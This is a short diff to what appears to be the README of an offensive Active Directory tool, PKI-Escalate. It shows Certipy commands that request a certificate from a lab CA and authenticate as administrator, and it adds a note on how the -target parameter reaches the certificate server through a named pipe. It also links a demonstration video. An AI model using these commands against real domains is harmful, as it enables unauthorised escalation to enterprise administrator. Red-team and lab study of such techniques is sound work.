@@ -64,6 +64,8 @@ certipy req -username ganon@chasm.dc01.hyrule.local -ca 'HYRULE-CA' -target HYRU
 certipy auth -pfx administrator.pfx -dc-ip 192.168.55.5
 ```
 
+⚠ **NOTE**: When requesting your certificate with Certipy, the `-target` parameter points to the certificate server. This is because it connects via the `ncacn_np:\\HOSTNAME[\pipe\cert]` pipe to request information! ⚠
+
 Please consider clicking on the image below to watch a demonstration video:
 
 [![PKI-Escalate Demonstration - Domain Admin to Enterprise Admin](https://img.youtube.com/vi/XtwKvZ-kZRE/0.jpg)](http://www.youtube.com/watch?v=XtwKvZ-kZRE "PKI-Escalate Demonstration - Domain Admin to Enterprise Admin")
